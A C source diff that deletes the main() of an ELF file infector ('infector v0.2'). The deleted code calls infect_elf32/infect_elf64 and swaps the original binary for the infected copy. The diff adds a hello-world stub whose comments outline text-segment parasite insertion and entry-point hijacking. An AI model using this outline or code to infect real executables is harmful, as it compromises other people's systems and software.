@@ -12,78 +12,27 @@
 #include "common.h"
 
 
-int main(int argc, char *argv[]) {
-    int fd, fdout, res;
-    struct stat st;
-    char magic[EI_NIDENT];
-    char tmpfile[] = "XXXXXX";
-
-
-    if (argc != 2) {
-        printf("oblique 2010\n");
-        printf("infector v0.2\n\n");
-        printf("usage: %s elf_file\n", argv[0]);
-        return 1;
-    }
-
-    if (stat(argv[1], &st) == -1) {
-        print_error(__FILE__, __LINE__-1, errno, "stat");
-        return 1;
-    }
-
-    if ((fd = open(argv[1], O_RDONLY)) == -1) {
-        print_error(__FILE__, __LINE__-1, errno, "open");
-        return 1;
-    }
-
-    if ((fdout = mkstemp(tmpfile)) == -1) {
-        print_error(__FILE__, __LINE__-1, errno, "mkstemp");
-        close(fd);
-        return 1;
-    }
-
-    if ((res = read(fd, magic, EI_NIDENT)) == -1) {
-        print_error(__FILE__, __LINE__-1, errno, "read");
-        goto _fatal;
-    } else if (res != EI_NIDENT) {
-        fprintf(stderr, "[-] File is too small\n");
-        goto _fatal;
-    }
-
-
-    if (memcmp(magic, ELFMAG, SELFMAG) == 0) {
-        if (magic[EI_CLASS] == ELFCLASS32) {
-            if (infect_elf32(fd, fdout) == -1)
-                goto _fatal;
-        } else if (magic[EI_CLASS] == ELFCLASS64) {
-            if (infect_elf64(fd, fdout) == -1)
-                goto _fatal;
-        } else {
-            fprintf(stderr, "Unknown ELF class.\n");
-            goto _fatal;
-        }
-    } else {
-        fprintf(stderr, "File not ELF.\n");
-        goto _fatal;
-    }
-
-    close(fd);
-    close(fdout);
-
-    printf("[+] Replace the original file\n");
-    if (replace_file(tmpfile, argv[1], st) == -1) {
-        unlink(tmpfile);
-        return 1;
-    }
-
-    printf("[+] Done!\n");
-
+int main() {
+    //    printf("Mister!:\n");
+    printf("Hello world!:\n");
+/*
+    printf("Init params:\n");
+    printf("1. Input file name: hello_world_source_app\n");
+    printf("2. Inserted code file: mycode.c\n");
+    printf("Write new elf executable file start.\n");
+    printf("\t..increase e_shoff by PAGE_SIZE in the ELF header\n");
+    printf("\t..patch the insertion code (parasite) to jump to the entry point (original)\n");
+    printf("\t..locate the text segment program header\n");
+    printf("\t..modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)\n");
+    printf("\t..increase p_filesz by account for the new code (parasite)\n");
+    printf("\t..increase p_memsz to account for the new code (parasite)\n");
+    printf("\t..for each phdr who's segment is after the insertion (text segment) increase p_offset by PAGE_SIZE\n");
+    printf("\t..for the last shdr in the text segment increase sh_size by the parasite length\n");
+    printf("\t..for each shdr who's section resides after the insertion increase sh_offset by PAGE_SIZE\n");
+    printf("\t..physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)\n");
+    printf("Write new elf executable file success.\n");
+    printf("Written output file name: hello_world_with_my_code_app\n");
+    */
     return 0;
-
-
-_fatal:
-    close(fd);
-    close(fdout);
-    unlink(tmpfile);
-    return 1;
 }
+
